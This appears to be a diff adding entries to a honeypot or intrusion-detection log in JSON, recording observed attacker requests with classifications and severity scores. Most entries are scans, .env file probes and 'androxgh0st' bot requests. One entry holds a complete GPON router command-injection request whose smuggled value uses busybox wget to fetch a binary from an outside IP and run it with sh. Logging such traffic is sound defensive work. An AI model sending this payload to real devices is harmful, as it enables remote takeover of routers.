@@ -29500,5 +29500,71 @@
     "node": "Droplet-LON",
     "technique": "[PING] Connection handshake initiated without payload text.",
     "total_attacks": 1
+  },
+  {
+    "timestamp": "2026-06-04T10:07:30.429152+00:00",
+    "ip": "121.121.214.194",
+    "classification": "Command Injection",
+    "severity": "Critical",
+    "risk_score": 10,
+    "summary": "An attacker attempted command injection via a GPON diagnostic form to download and execute a malicious binary.",
+    "node": "Droplet-BLR",
+    "technique": "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nUser-Agent: terrabot-owned-you\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://140.233.190.47/gpon+-O+/tmp/ger;sh+/tmp/ger`&ipv=0",
+    "total_attacks": 1
+  },
+  {
+    "timestamp": "2026-06-04T10:27:36.761065+00:00",
+    "ip": "78.153.140.39",
+    "classification": "Information Gathering",
+    "severity": "Medium",
+    "risk_score": 5,
+    "summary": "An attacker attempted to download a .env configuration file, which could expose sensitive environment variables.",
+    "node": "Droplet-LON",
+    "technique": "GET /.env HTTP/1.1",
+    "total_attacks": 1
+  },
+  {
+    "timestamp": "2026-06-04T10:27:41.718147+00:00",
+    "ip": "78.153.140.39",
+    "classification": "Web Exploit Attempt",
+    "severity": "Medium",
+    "risk_score": 6,
+    "summary": "An attacker sent a POST request with a suspicious parameter containing 'androxgh0st', likely probing for a web vulnerability or indicating bot activity.",
+    "node": "Droplet-LON",
+    "technique": "POST / HTTP/1.1\r\n0x%5B%5D=androxgh0st",
+    "total_attacks": 1
+  },
+  {
+    "timestamp": "2026-06-04T10:49:30.019384+00:00",
+    "ip": "78.153.140.149",
+    "classification": "Information Gathering",
+    "severity": "Medium",
+    "risk_score": 5,
+    "summary": "An attacker attempted to download a .env configuration file, which could expose sensitive environment variables.",
+    "node": "Droplet-NYC",
+    "technique": "GET /.env HTTP/1.1",
+    "total_attacks": 1
+  },
+  {
+    "timestamp": "2026-06-04T10:49:34.750855+00:00",
+    "ip": "78.153.140.149",
+    "classification": "Web Exploit Attempt",
+    "severity": "Medium",
+    "risk_score": 6,
+    "summary": "An attacker sent a POST request with a suspicious parameter containing 'androxgh0st', likely probing for a web vulnerability or indicating bot activity.",
+    "node": "Droplet-NYC",
+    "technique": "POST / HTTP/1.1\r\n0x%5B%5D=androxgh0st",
+    "total_attacks": 1
+  },
+  {
+    "timestamp": "2026-06-04T10:51:57.884403+00:00",
+    "ip": "50.6.168.183",
+    "classification": "Network Scan",
+    "severity": "Low",
+    "risk_score": 1,
+    "summary": "A basic network ping or connection handshake was initiated without any specific payload.",
+    "node": "Droplet-LON",
+    "technique": "[PING] Connection handshake initiated without payload text.",
+    "total_attacks": 1
   }
 ]
